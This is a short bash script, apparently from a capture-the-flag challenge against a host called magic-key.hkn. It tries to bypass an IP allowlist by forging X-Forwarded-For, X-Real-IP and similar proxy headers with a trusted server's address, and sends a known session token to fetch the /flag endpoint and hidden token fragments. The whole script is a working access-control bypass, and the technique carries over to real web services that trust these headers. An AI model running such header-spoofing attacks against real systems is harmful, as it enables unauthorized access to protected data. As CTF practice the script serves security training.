#!/bin/bash
# Test whether magic-key.hkn's Session-Token check is actually an IP allowlist
# (only secret-server's IP is trusted) rather than a content check, by spoofing
# the source IP via common proxy headers while using the EXACT known decoy token.
TARGET="magic-key.hkn"
SECRET_IP="77.76.10.37"
TOKEN="dGhpcyB0b2tlbiBpcyBub3QgZ29vZA"

for HEADER in "X-Forwarded-For" "X-Real-IP" "X-Originating-IP" "X-Client-IP" "True-Client-IP"; do
    echo "### /flag with $HEADER: $SECRET_IP + known decoy Session-Token + URL-Maybe ###"
    curl -s --connect-timeout 3 --max-time 5 -i "http://$TARGET/flag" \
        -H "$HEADER: $SECRET_IP" \
        -H "Session-Token: $TOKEN" \
        -H "URL-Maybe: /flag" | head -5
    echo "---"
done

echo ""
echo "### Same but against /next_chars?char=s, to see if spoofing flips decoy->real fragments ###"
for HEADER in "X-Forwarded-For" "X-Real-IP"; do
    echo "### $HEADER ###"
    curl -s --connect-timeout 3 --max-time 5 "http://$TARGET/next_chars?char=s" \
        -H "$HEADER: $SECRET_IP" \
        -H "Session-Token: $TOKEN" \
        -H "URL-Maybe: /flag"
    echo ""
done
